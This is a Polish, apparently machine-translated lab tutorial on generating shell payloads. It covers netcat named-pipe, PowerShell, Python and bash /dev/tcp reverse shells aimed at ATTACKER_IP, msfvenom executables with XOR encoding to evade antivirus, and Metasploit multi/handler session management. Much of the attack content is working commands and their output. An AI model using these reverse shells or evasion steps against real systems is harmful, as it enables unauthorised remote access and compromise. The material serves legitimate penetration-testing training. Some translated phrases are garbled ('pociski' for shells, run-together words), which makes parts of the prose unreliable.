---

Omówiliśmy przechwytywanie powłok, konfigurowanie programów nasłuchujących, stabilizowanie połączeń i tworzenie w pełni interaktywnych terminali TTY. Ale jest pewna luka: jak w ogóle sprawić, by te powłoki nawiązywały połączenie z bazą? Pisanie `nc ATTACKER_IP 4444 -e /bin/bash`działa, gdy jesteśmy już na komputerze, ale prawdziwe testy penetracyjne wymagają **ładunków** , czyli samodzielnych programów, które nawiązują połączenia z powłoką po uruchomieniu w systemach docelowych.

Rozważmy typowy scenariusz: odkryliśmy lukę w zabezpieczeniach przesyłania plików, która pozwala nam przesyłać pliki wykonywalne, ale nie możemy bezpośrednio wchodzić w interakcję z systemem, aby wydawać polecenia powłoki. Potrzebujemy **ładunku** , pliku wykonywalnego, który po uruchomieniu automatycznie łączy się z naszym oczekującym programem nasłuchującym. Albo może zidentyfikowaliśmy…phishing Okazja, w której potrzebujemy niewinnie wyglądającego załącznika, który ustanawia trwały dostęp. Ręczne polecenia powłoki nie będą tu działać; potrzebujemy wygenerowanych, możliwych do wdrożenia ładunków.

Ta sala wypełnia lukę między _„Potrafię łapać pociski”_ a _„Potrafię tworzyć ładunki, które generują te pociski”_ . Nauczymy się tworzyć ładunki dla różnych platform, metod dostarczania i wymagań dotyczących unikania, przekształcając nasze umiejętności łapania pocisków w kompletny zestaw narzędzi ofensywnych.

## Cele edukacyjne

- Generuj niestandardowe ładunki powłoki za pomocą msfvenom dla wielu platform i formatów
- Poznaj różnice między ładunkami etapowymi i bez etapowymi oraz dowiedz się, kiedy każdy z nich jest odpowiedni
- Używać Metasploit multi/handler do przechwytywania ładunków etapowych i zarządzania sesjami
- Wdrażaj powłoki internetowe w celu zapewnienia stałego dostępu za pośrednictwem aplikacji internetowych
- Twórz alternatywne ładunki, gdy standardowe narzędzia są niedostępne lub ograniczone

## Wymagania wstępne dotyczące nauki

- [Podstawy powłok i słuchaczy](https://tryhackme.com/room/shellsfundamentals)
- [Metasploit:Meterpreter](https://tryhackme.com/room/meterpreter) 
- [Podstawy aplikacji internetowych](https://tryhackme.com/room/webapplicationbasics)

Przesyłanie webshelli można wykonać za `http://MACHINE_IP`pomocą przeglądarki internetowej AttackBox.  
  
Poza podstawowymi przykładami netcata z  sali [„Podstawy powłok i odbiorników”](https://tryhackme.com/room/shellsfundamentals) , scenariusze z życia wzięte często wymagają innych podejść do obsługi ładunku. Niektóre systemy w ogóle nie obsługują netcata, inne mają ograniczone wersje, a wiele środowisk filtruje lub blokuje proste polecenia powłoki.

## Netcat bez flagi -e

Wiele współczesnych dystrybucji Linuksa zawiera warianty netcata, które `-e`ze względów bezpieczeństwa nie obsługują tej flagi. [OpenBSD(otwiera się w nowej karcie)](https://man.openbsd.org/nc.1)Netcat, powszechnie spotykany w systemach nastawionych na bezpieczeństwo, celowo wyklucza tę funkcjonalność. W przypadku napotkania tego ograniczenia, potoki nazwane zapewniają niezawodne obejście, które odtwarza tę samą funkcjonalność.

Nazwany potok (FIFO – First In, First Out) łączy procesy, umożliwiając odczyt danych zapisanych przez jeden proces przez inny. Możemy to wykorzystać do stworzenia cyklicznego przepływu danych, w którym netcat przekazuje polecenia do powłoki, a dane wyjściowe powłoki wracają przez netcat do naszej maszyny atakującej.

W przypadku powłoki bind bez `-e`flagi należy użyć tego polecenia na obiekcie docelowym:

Maszyna docelowa

```bash
linux@target:~$ mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Wyjaśnienie flag:

- `-l`: Tryb słuchania
- `-v`:Wyjście szczegółowe
- `-n`: Pomiń rozwiązywanie DNS
- `-p 8080`: Nasłuchuj na porcie 8080

To polecenie tworzy nazwany potok w [brakuje nazwy] `/tmp/f`, uruchamia program nasłuchujący netcat, który odczytuje dane wejściowe z potoku, przekazuje dane wyjściowe netcat (nasze polecenia) do powłoki i przekierowuje dane wyjściowe i błędy powłoki z powrotem do potoku. Cykliczny przepływ zapewnia, że ​​polecenia i odpowiedzi przemieszczają się między naszym komputerem a powłoką docelową.

W przypadku powłoki odwrotnej składnia ulega niewielkiej zmianie, aby wykorzystać tryb połączenia netcata:

Maszyna docelowa

```bash
linux@target:~$ mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Oba polecenia czyszczą nazwany kanał po zamknięciu połączenia, nie pozostawiając żadnych artefaktów w systemie docelowym.

## Odwrotne powłoki programu PowerShell

W środowiskach Windows, a zwłaszcza na serwerach, program PowerShell jest często dostępny nawet wtedy, gdy tradycyjne narzędzia wiersza poleceń są ograniczone. Integracja programu PowerShell z platformą .NET zapewnia bezpośredni dostęp do gniazd TCP, umożliwiając tworzenie powłok odwrotnych bez konieczności przesyłania dodatkowych plików binarnych.

Standardowa powłoka odwrotna programu PowerShell wykorzystuje klasy klienta TCP platformy .NET do otwierania połączenia i uruchamiania poleceń. Ten jeden wiersz kodu daje nam w pełni interaktywną powłokę:

Maszyna docelowa

```powershell
PS C:\> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

To polecenie tworzyTCPpołączenie klienta z naszą atakującą maszyną, odczytuje polecenia z strumienia sieciowego i wykonuje je za pomocąPowerShell's `Invoke-Expression`( `iex`) i odsyła wyniki przez to samo połączenie. Powłoka zawiera wiersz poleceń programu PowerShell z bieżącym katalogiem dla lepszej użyteczności.

Działa na zasadzie ciągłej pętli: odczytuje dane z naszego komputera, traktuje je jako polecenie programu PowerShell, wykonuje i odsyła dane wyjściowe. Rezultatem jest w pełni funkcjonalna sesja programu PowerShell przez sieć.

## Powłoki oparte na skryptach

Wiele systemów ma domyślnie zainstalowane języki skryptowe, których możemy używać do tworzenia powłok, gdy brakuje tradycyjnych narzędzi. Jest to szczególnie przydatne, gdy kod jest wykonywany za pośrednictwem aplikacji internetowych, zadań zaplanowanych lub innych metod nieinteraktywnych. Python, Perl, Ruby i PHP posiadają funkcje sieciowe, które umożliwiają otwarcie gniazda i utworzenie powłoki. Dwiema najczęściej używanymi opcjami w systemach Linux są Python i sam bash.

**Odwrotna powłoka Pythona**

Dzięki Pythonowi `socket`i  `os`jego modułom możemy tworzyć powłoki odwrotne w systemach Linux, w których Python jest powszechnie dostępny:

Odwrotna powłoka Pythona

```python
linux@target:~$ python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Ten ładunek Pythona tworzy połączenie gniazda, duplikuje deskryptor pliku gniazda na stdin, stdout i stderr, a następnie uruchamia powłokę bash z pseudoterminalem w celu zapewnienia lepszej interaktywności.

**Bash TCP Reverse Shell**

Jeśli języki skryptowe nie są dostępne, wbudowane funkcje sieciowe powłoki bash umożliwiają tworzenie powłok przy użyciu specjalnych plików urządzeń:

Bash TCP Reverse Shell

```bash
linux@target:~$ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

`/dev/tcp`Ta technika wykorzystuje pseudourządzenie powłoki  bash do utworzenia połączenia sieciowego, przekierowując dane wejściowe i wyjściowe przez połączenie, aby utworzyć interaktywną powłokę. Należy pamiętać, że `/dev/tcp`wymaga to skompilowania powłoki bash  `--enable-net-redirections`i może nie być dostępne w wersji minimalnej.Linuxinstalacje.

## Strategia wyboru ładunku

Wybór odpowiedniego ładunku zależy od środowiska docelowego i dostępnych narzędzi. Wybierając podejście, należy wziąć pod uwagę następujące czynniki:

- **Docelowy system operacyjny:** preferowane systemy WindowsPowerShellładunki, podczas gdyLinuxSystemy te dobrze współpracują z alternatywami typu bash, Python lub netcat.
- **Dostępne interpretatory:** Sprawdź, jakie języki skryptowe lub narzędzia są zainstalowane. Python, Perl, Ruby iPHPwszystkie mają funkcje sieciowe pozwalające na tworzenie powłok.
- **Ograniczenia sieciowe:** Niektóre środowiska filtrują połączenia wychodzące na określonych portach lub protokołach. Przetestuj różne porty i metody połączenia, jeśli początkowe próby się nie powiodą.
- **Kontekst wykonania:** powłoki internetowe, zadania zaplanowane i konta usług mogą mieć inne uprawnienia i dostępność narzędzi niż interaktywne sesje użytkowników.
- **Obawy dotyczące wykrywania:** Niektóre ładunki uruchamiają systemy antywirusowe lub wykrywania punktów końcowych łatwiej niż inne.PowerShell, w szczególności, jest ściśle monitorowany w nowoczesnych środowiskach Windows.

## Zasoby ładunku

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) [​(otwiera się w nowej karcie)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)Repozytorium przechowuje kompleksową ściągawkę ładunków powłoki w wielu językach, obejmującą powłoki odwrotne i wiążące, a także warianty specyficzne dla platformy. Odpowiednie treści są wymienione w sekcji **„Metodologia i zasoby”** w repozytorium. Obejmuje ono języki Python, Perl, Ruby,PHP, Java i inne, co sprawia, że ​​warto dodać tę aplikację do zakładek w przypadku nietypowych środowisk docelowych.

## Testowanie i weryfikacja

Zawsze najpierw testuj ładunki w kontrolowanym środowisku. RóżneSystem operacyjnyWersje, warianty powłoki i konfiguracje zabezpieczeń mogą powodować nieoczekiwane awarie. Wiedza o tym, jak każdy ładunek działa na niskim poziomie, jest również pomocna, gdy w kolejnym zadaniu przechodzimy do zautomatyzowanych generatorów, takich jak msfvenom, ponieważ możemy rozwiązywać problemy i dostosowywać dane wyjściowe, zamiast traktować je jak czarne skrzynki.

Ręczne tworzenie ładunków sprawdza się w wielu scenariuszach, ale rzeczywiste działania często wymagają ładunków, które unikają wykrycia, są ukierunkowane na różne platformy lub łączą się z systemami poeksploatacyjnymi. **Msfvenom** , częśćMetasploitFramework automatyzuje to wszystko. Obsługuje kodowanie, formatowanie wyjściowe i targetowanie platformy, co ręcznie zajęłoby wieki.

## Zrozumienie roli msfvenom

Msfvenom to generator i koder ładunków. Tworzy kod wykonywalny, który nawiązuje połączenie z powłoką, łącząc się z maszyną atakującą w celu użycia powłok odwrotnych lub otwierając port nasłuchujący, z którym możemy się połączyć w celu użycia powłok bind. W przeciwieństwie do ręcznych poleceń powłoki z poprzednich zadań, msfvenom generuje kompletne, samodzielne ładunki, które możemy dostarczać za pośrednictwem załączników do wiadomości e-mail, plików przesyłanych przez sieć lub frameworków wykorzystujących luki w zabezpieczeniach.

Dlaczego warto się nim zainteresować: obsługuje targetowanie międzyplatformowe, ma wbudowane kodowanieAVunikanie, obsługuje dziesiątki formatów wyjściowych i podłącza się bezpośrednio doMetasploitModuły poeksploatacyjne. Kiedy celujemy w mieszankęLinuxi Windows lub potrzebujesz czegoś bardziej dopracowanego niż jednolinijkowiec, msfvenom jest rozwiązaniem.

## Podstawowa składnia msfvenom

Wszystkie polecenia msfvenom mają spójną strukturę, która określa typ ładunku, opcje konfiguracji i wymagania wyjściowe:

Składnia msfvenom

```shell-session
attacker@tryhackme:~$ msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

Na przykład, aby wygenerować plik wykonywalny systemu Windows, który tworzy powłokę odwrotną:

msfvenom

```shell-session
attacker@tryhackme:~$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.14.15 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Wyjaśnienie flag:

- `-p`:Określa typ ładunku i architekturę
- `-f exe`: Ustawia format wyjściowy na plik wykonywalny systemu Windows
- `-o shell.exe`: Definiuje nazwę pliku wyjściowego
- `LHOST`:Adres IP naszej maszyny atakującej do wywołań zwrotnych
- `LPORT`:Port, w którym będzie nasłuchiwał nasz handler

## Ładunki etapowe i bezetapowe

Jedną z najważniejszych różnic w msfvenom jest sposób dostarczania i wykonywania ładunków. Zrozumienie tej różnicy wpływa zarówno na wybór ładunku, jak i na typ potrzebnego nam odbiornika.

**Ładunki bezstopniowe** zawierają wszystko, co potrzebne do nawiązania połączenia z powłoką, w jednym, samodzielnym pakiecie. Po uruchomieniu natychmiast podejmują próbę ponownego połączenia z naszym programem nasłuchującym, bez konieczności pobierania dodatkowych plików ani instalowania dodatkowych komponentów.

Muszla bezstopniowa

```shell-session
attacker@tryhackme:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f elf -o stageless_shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: stageless_shell
```

Ładunki bezstopniowe działają z prostymi nasłuchiwaczami netcat i nie wymagają specjalnego oprogramowania. Są jednak większe i częściej powodują wykrycie wirusa, ponieważ cały kod powłoki znajduje się w pliku początkowym.

**Ładunki etapowe** wykorzystują podejście dwufazowe. Początkowy etap to niewielki fragment kodu, który nawiązuje połączenie i pobiera cały ładunek z naszej maszyny atakującej. To rozdzielenie zapewnia korzyści w zakresie unikania ataków i dostarczania ładunku.

Etapowana powłoka

```shell-session
attacker@tryhackme:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -o staged_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: staged_shell.exe
```

Mniejszy, początkowy etap może czasami ominąć oprogramowanie antywirusowe, które koncentruje się na wykrywaniu sygnatur. Pełny ładunek nigdy nie dotyka dysku docelowego, co utrudnia jego wykrycie przez narzędzia bezpieczeństwa oparte na plikach. Jednak ładunki etapowe wymagają wyspecjalizowanych modułów nasłuchujących, takich jak multi/handler Metasploit, które rozumieją protokół etapowy.

## Konwencje nazewnictwa ładunków

Msfvenom stosuje systematyczną konwencję nazewnictwa, która wskazuje platformę docelową, architekturę i zachowanie ładunku. Ogólny format jest zgodny z tym schematem:

```text
<platform>/<architecture>/<payload>
```

**Przykłady platform:**

- `linux/x64/shell_reverse_tcp`:Linux64-bitowa, bezstopniowa powłoka odwrotna
- `windows/x64/shell/reverse_tcp`: 64-bitowa odwrócona powłoka etapowa systemu Windows
- `windows/shell_reverse_tcp`: 32-bitowa, bezstopniowa powłoka odwrotna dla systemu Windows
- `osx/x64/shell_reverse_tcp`: macOS 64-bitowa, bezstopniowa powłoka odwrotna

**Identyfikacja etapowa i bezetapowa:**

W przypadku większości ładunków msfvenom wspólna konwencja nazewnictwa ułatwia rozróżnienie tych dwóch typów:

- **Bezstopniowy:** Zwykle używa się podkreśleń przed transportem (np.  `shell_reverse_tcp`)
- **Staged:** Zwykle używa się ukośnika przed transportem (np. `shell/reverse_tcp`)

Ta konwencja obowiązuje dla większości ładunków i stanowi wiarygodny pierwszy wskaźnik. Nie jest ona jednak uniwersalna dla każdego ładunku w bibliotece, dlatego w razie wątpliwości należy jej użyć, `msfvenom --info <payload>`aby potwierdzić, czy ładunek jest etapowany, czy nieetapowany, przed utworzeniem wokół niego struktury.

## Ładunki Meterpretera

Meterpreter to zaawansowane środowisko powłoki Metasploit, oferujące możliwości wykraczające poza podstawowe wykonywanie poleceń. W przeciwieństwie do prostych powłok, które przekazują polecenia w obie strony, Meterpreter oferuje bogatą w funkcje platformę do działań poeksploatacyjnych.

Sesje Meterpretera zawierają wbudowane polecenia do operacji na plikach, wyszukiwania sieci, eskalacji uprawnień i manipulacji systemem. Platforma działa w całości w pamięci, co utrudnia jej wykrycie w porównaniu z tradycyjnymi powłokami opartymi na narzędziach dyskowych.

Przykłady

```shell-session
# Windows 64-bit staged Meterpreter
attacker@tryhackme:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -o meterpreter_staged.exe

# Linux 32-bit stageless Meterpreter
attacker@tryhackme:~$ msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f elf -o meterpreter_stageless
```

Meterpreterładunki wymagająMetasploitMulti/handler firmy 's do prawidłowego zarządzania sesjami. Choć są bardziej skomplikowane w konfiguracji niż podstawowe powłoki, oferują znacznie więcej funkcji w przypadku pełnego naruszenia bezpieczeństwa systemu i działań poeksploatacyjnych.

## Formaty wyjściowe i przypadki użycia

Msfvenom obsługuje wiele formatów wyjściowych, z których każdy jest dostosowany do różnych metod dostarczania danych i środowisk docelowych. Właściwy format zależy od sposobu, w jaki planujemy wykonać ładunek na celu.

**Do popularnych formatów należą:**

- `exe`Pliki wykonywalne systemu Windows do bezpośredniego wykonania
- `elf`: Pliki wykonywalne systemu Linux
- `dll`:Dynamiczne biblioteki dlaBiblioteka DLLataki wstrzyknięcia
- `aspx`:Powłoki internetowe ASP.NET dla serwerów IIS
- `jsp`: Strony serwera Java dla aplikacji internetowych Java
- `war`:Archiwa aplikacji internetowych dla serwerów aplikacji Java
- `python`:Skrypty Pythona dla środowisk z interpreterami Pythona
- `powershell`,PowerShellskrypty dla środowisk Windows

## Odkrywanie dostępnych ładunków

Msfvenom zawiera rozbudowane biblioteki ładunków obejmujące wiele platform i scenariuszy. Użyj funkcji listy, aby poznać dostępne opcje. To polecenie przesyła listę ładunków msfvenom przez grep, aby znaleźć konkretne typy ładunków:

Ładunki

```shell-session
attacker@tryhackme:~$ msfvenom --list payloads | grep linux | grep meterpreter
    linux/armle/meterpreter/reverse_tcp                       Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back stager
    linux/armle/meterpreter_reverse_http                      Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter_reverse_https                     Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter_reverse_tcp                       Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsbe/meterpreter/reverse_tcp                      Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back stager
```

## Kodowanie i unikanie

Nowoczesne systemy antywirusowe i wykrywania punktów końcowych aktywnie skanują w poszukiwaniu znanych sygnatur ładunku. Msfvenom zawiera funkcje kodowania, które pozwalają modyfikować wygląd ładunku i potencjalnie unikać wykrywania opartego na sygnaturach:

Kodowanie

```shell-session
attacker@tryhackme:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -e x64/xor -i 3 -o encoded_shell.exe
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x64/xor
x64/xor succeeded with size 119 bytes (iteration=0)
x64/xor succeeded with size 143 bytes (iteration=1)
x64/xor succeeded with size 167 bytes (iteration=2)
x64/xor chosen with final size 167 bytes
Payload size: 167 bytes
Final size of exe file: 7168 bytes
Saved as: encoded_shell.exe
```

Wyjaśnienie flag:

- `-e x64/xor`:Użyj x64/xorenkoder do transformacji ładunku
- `-i 3`: Zastosuj kodowanie 3 razy, aby jeszcze bardziej zmienić podpis

Proces kodowania przekształca ładunek za pomocą operacji matematycznych (takich jakXOR) wielokrotnie, aby zmienić jego sygnaturę. Chociaż może to pomóc w obejściu podstawowych mechanizmów wykrywania antywirusowego, nowoczesne rozwiązania bezpieczeństwa często obejmują detekcję opartą na zachowaniu, która pozwala zidentyfikować szkodliwą aktywność niezależnie od kodowania.

## Integracja z przepływami pracy dotyczącymi ataków

Ładunki Msfvenom działają najlepiej, gdy są zintegrowane z kompletnymi procesami ataków. Zastanów się, w jaki sposób ładunek będzie dostarczany, uruchamiany i obsługiwany:

- **Zagadnienia dotyczące dostarczania:** załączniki do wiadomości e-mail, przesyłanie danych przez sieć, przechwytywanie danych przez USB lub integracja z eksploitami wymagają różnych formatów i charakterystyk ładunku.
- **Kontekst wykonania:** uprawnienia użytkownika, dostępne interpretatory i ograniczenia systemowe mają wpływ na wybór ładunku i wymagania dotyczące kodowania.
- **Przygotowanie modułu obsługi:** ładunki etapowe wymagają konfiguracji wielu modułów obsługi, podczas gdy ładunki bezetapowe mogą korzystać z prostych programów nasłuchujących netcat.

Następnym zadaniem jest skonfigurowanie modułów przechwytujących te ładunki.

Odpowiedz na poniższe pytania

Który ładunek msfvenom wygeneruje 64-bitową powłokę Linux bezstopniowego odwrotnego TCP?

Proste programy nasłuchujące netcat działają dobrze w przypadku podstawowych powłok, ale nie potrafią obsłużyć protokołu etapowego, który obsługuje etapowe ładunki iMeterpreterna których opierają się sesje. To właśnie tamMetasploitWkracza **multi/handler** . Potrafi on odbierać stagery, odsyłać pełne dane, zarządzać wieloma sesjami jednocześnie i wykonywać czynności, których zwykły nasłuchujący netcat po prostu nie potrafi.

## Zrozumienie celu Multi/Handlera

Multi/handler jestMetasploitUniwersalny odbiornik ładunku. Przechwytuje i zarządza połączeniami z ładunków generowanych przez msfvenom. W przeciwieństwie do netcata, który po prostu przesyła surowe dane między gniazdami, multi/handler aktywnie uczestniczy w połączeniu: wysyła etapowe komponenty ładunku, negocjujeMeterpreterprotokoły i śledzi sesje.

Potrzebujemy multi/handler za każdym razem, gdy używamy ładunków etapowych, ponieważ obsługuje on dwufazowe uzgadnianie: odbiera początkowy etap etapowy, a następnie przekazuje cały ładunek z powrotem do celu.MeterpreterSesje również zależą od niego w swoim protokole komunikacyjnym.

## Konfigurowanie Multi/Handler

Konfigurowanie wielu/obsługujących odbywa się w prosty sposób w ramachMetasploitKonsola. Konfiguracja wymaga dokładnego dopasowania konfiguracji obsługi do ładunku wygenerowanego za pomocą msfvenom.

Zacznij od uruchomieniaMetasploiti ładowanie modułu multi/handler:

msfconsole

```bash
attacker@tryhackme:~$ sudo msfconsole
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >
```

Sprawdź aktualną konfigurację i dostępne opcje:

```shell-session
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

## Konfigurowanie parametrów obsługi

Trzy parametry muszą dokładnie odpowiadać tym wygenerowanym przez msfvenom: typ ładunku, adres hosta nasłuchującego i port nasłuchujący. Błąd któregokolwiek z tych parametrów spowoduje, że połączenie zostanie przerwane.

```shell-session
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.15
LHOST => 10.10.14.15
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```

Parametr LHOST wymaga szczególnej uwagi. Wartość w tym miejscu musi być zgodna z LHOST, który wbudowaliśmy w ładunek podczas generowania msfvenom. Ładunek na stałe koduje nasz adres IP i będzie się łączyć tylko z tym konkretnym adresem. Ustaw LHOST na poprawny adres IP interfejsu tunelowego. W AttackBox będzie to `ens5`. 

Przed uruchomieniem procedury obsługi sprawdźmy konfigurację:

```shell-session
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

## Uruchamianie programu obsługi

Po skonfigurowaniu wystarczy uruchomić moduł obsługi za pomocą `exploit`polecenia. `-j`Flaga uruchamia moduł obsługi w tle, co pozwala nam kontynuować korzystanie z konsoli Metasploit do innych zadań, podczas gdy moduł obsługi oczekuje na połączenia.

```shell-session
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.15:4444
msf6 exploit(multi/handler) >
```

Program obsługi połączeń aktywnie nasłuchuje połączeń. W przypadku korzystania z portów poniżej 1024 należy uruchomićMetasploitz `sudo`. Praca w tle pozwala nam skonfigurować wiele procedur obsługi połączeń na różnych portach lub skonfigurować dodatkowe moduły podczas oczekiwania na połączenia.

## Zarządzanie połączeniami przychodzącymi

Gdy ładunek jest wykonywany w systemie docelowym, multi/handler automatycznie obsługuje proces połączenia. Ładunki etapowe obejmują odebranie stagera, przesłanie pełnego ładunku i nawiązanie sesji. Konsola wyświetla informacje o połączeniu i przypisuje numer sesji do zarządzania.

```shell-session
[*] Sending stage (200774 bytes) to 10.10.14.100
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.14.100:49847) at 2024-01-15 14:23:45 +0000

msf6 exploit(multi/handler) >
```

Proces połączenia pokazuje transmisję etapową i nawiązanie sesji. W przypadku ładunków etapowych zobaczymy komunikat „Wysyłanie etapu”, gdy multi/handler prześle pełny ładunek do celu. Sesja otrzymuje unikalny identyfikator (w tym przykładzie sesja 1) do zarządzania.

## Zarządzanie sesjami

Multi/handler zapewnia nam właściwe zarządzanie sesjami. Możemy wyświetlić listę aktywnych sesji, przejść do konkretnej sesji i uruchomić polecenia w tle na wielu połączeniach jednocześnie.

Wyświetl wszystkie aktywne sesje:

```shell-session
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type               Information                          Connection
  --  ----  ----               -----------                          ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows...  10.10.14.15:4444 -> 10.10.14.100:49847 (10.10.14.100)
```

Wejdź w interakcję z konkretną sesją, korzystając z jej numeru ID:

```shell-session
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

C:\Users\victim\Desktop>whoami
target-machine\victim

C:\Users\victim\Desktop>hostname
TARGET-MACHINE

C:\Users\victim\Desktop>
```

Wróć do konsoli Metasploit z aktywnej sesji za pomocą Ctrl+Z lub wpisując `background`. Spowoduje to włączenie sesji w tle, a jednocześnie utrzymanie jej aktywności, dzięki czemu będziemy mogli uzyskać dostęp do innychMetasploitmodułów lub wchodzić w interakcję z różnymi sesjami.

## Zaawansowane funkcje obsługi

Multi-handler ma kilka dodatkowych sztuczek, które okazują się przydatne, gdy podczas walki musimy żonglować wieloma zagrożonymi systemami.

**Wiele współbieżnych procedur obsługi**

Możemy uruchomić wiele procedur obsługi połączeń jednocześnie na różnych portach lub z różnymi typami ładunku, dzięki czemu jesteśmy gotowi na przechwycenie wszystkich wywołań zwrotnych.

```shell-session
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 10.10.14.15:8080

msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                     Payload opts
  --  ----                    -------                     ------------
  0   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://10.10.14.15:4444
  1   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://10.10.14.15:8080
```

**Trwałość i stabilność sesji**

W przeciwieństwie do połączeń netcat, które zrywają się po zerwaniu połączenia, sesje multi/handler posiadają logikę obsługi błędów i ponownego łączenia. Sesje Meterpretera mogą automatycznie próbować ponownie nawiązać połączenie i posiadają wbudowane mechanizmy trwałości.

**Integracja z modułami poeksploatacyjnymi**

Sesje przechwycone przez multi/handler są bezpośrednio podłączane do modułów Metasploit po eksploatacji. Możemy przeprowadzać kontrole eskalacji uprawnień, zbierać informacje o systemie lub przełączać się na inne segmenty sieci bezpośrednio z ustanowionej sesji.

## Obsługujący kontra podstawowi słuchacze

Kiedy tak naprawdę potrzebujemy multi/handlera, a kiedy zwykłego nasłuchiwacza netcata? Oto krótkie podsumowanie:

**Użyj multi/handler gdy:**

- Praca z ładunkami etapowymi wymagającymi komunikacji dwufazowej
- Korzystanie z sesji Meterpretera w celu zaawansowanej eksploatacji
- Zarządzanie wieloma równoczesnymi sesjami
- Wymaganie trwałości sesji i obsługi błędów
- Integracja z innymi modułami Metasploit

**Używaj prostych słuchaczy, gdy:**

- Praca z ładunkami bezetapowymi, które nie wymagają etapowania
- Przeprowadzanie szybkiego rozpoznania lub wykonywanie podstawowych poleceń
- Praca w środowiskach o ograniczonych zasobach
- Preferowanie lekkich narzędzi bez narzutu na framework

## Rozwiązywanie typowych problemów

Kilka typowych błędów może uniemożliwić nawiązanie połączenia. To pierwsze rzeczy, które należy sprawdzić, gdy ładunek zostanie odpalony, ale nic nie pojawi się w Metasploit.

- **Niezgodność ładunku:** Ładunek modułu obsługi musi dokładnie odpowiadać wygenerowanemu przez nas, w tym architekturze i typowi środowiska testowego. `shell/reverse_tcp`Moduł obsługi nie przechwyci `shell_reverse_tcp`ładunku.
- **Konfiguracja sieci:** LHOST musi być poprawnym adresem IP interfejsu, a `0.0.0.0`nie `localhost`.
- **Blokowanie zapory sieciowej:** Upewnij się, że zapora sieciowa maszyny atakującej zezwala na połączenia przychodzące na określonym porcie LPORT.
- **Wymagania dotyczące uprawnień:** Porty poniżej 1024 wymagają `sudo`.

